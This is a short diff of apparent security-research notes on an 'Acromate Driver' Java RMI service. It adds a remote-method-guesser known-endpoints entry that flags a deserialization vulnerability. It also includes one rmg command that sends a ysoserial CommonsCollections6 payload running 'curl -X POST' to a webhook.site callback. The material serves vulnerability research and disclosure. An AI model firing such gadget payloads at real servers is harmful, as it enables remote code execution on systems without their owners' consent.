@@ -18,4 +18,25 @@ String logout(String dummy)
 java -jar rmg-5.1.0-jar-with-dependencies.jar serialxxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar
 
 
+--------------------------------------------- to RMG remote-method-guesser/resources/known-endpoints/known-endpoints.yml (https://github.com/qtc-de/remote-method-guesser/blob/3398ec6abc0af18c71c1f90b0c85702469eabf75/resources/known-endpoints/known-endpoints.yml)
 
+- name: Acromate Driver
+  className:
+    - com.acromate.driver.core.DataObjectImpl_Stub
+
+  description: |
+    stuff
+    
+
+  remoteMethods:
+    - String register(String dummy, String dummy2)
+    - String login(String dummy, String dummy2)
+    - String logout(String dummy)
+
+  vulnerabilities:
+ 
+    - name: Deserialization
+      description: |
+        Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
+      references:
+        - https://github.com/qtc-de/remote-method-guesser#serial
